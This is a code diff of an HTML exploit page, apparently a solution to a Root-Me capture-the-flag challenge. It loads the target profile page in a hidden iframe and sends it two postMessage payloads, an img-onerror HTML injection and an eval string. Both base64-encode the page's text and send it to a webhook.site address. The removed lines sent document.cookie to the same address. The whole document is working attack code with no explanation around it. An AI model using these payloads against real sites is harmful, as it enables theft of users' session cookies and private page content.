@@ -1,5 +1,28 @@
+<!DOCTYPE html>
+<html>
+<body>
 <script>
 var wb = 'http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba';
-var w = window.open('http://challenge01.root-me.org:58003/profile');
-new Image().src = wb + '?c=' + btoa(document.cookie);
+var iframe = document.createElement('iframe');
+iframe.src = 'http://challenge01.root-me.org:58003/profile';
+iframe.style.display = 'none';
+document.body.appendChild(iframe);
+
+iframe.onload = function() {
+  setTimeout(function() {
+    // Si listener fait innerHTML = event.data
+    iframe.contentWindow.postMessage(
+      '<img src=x onerror="new Image().src=\'' + wb + '?d=\'+btoa(document.body.innerText)">',
+      '*'
+    );
+    // Si listener fait eval(event.data)
+    iframe.contentWindow.postMessage(
+      "new Image().src='" + wb + "?d='+btoa(document.body.innerText)",
+      '*'
+    );
+    new Image().src = wb + '?iframe=loaded';
+  }, 1000);
+};
 </script>
+</body>
+</html>
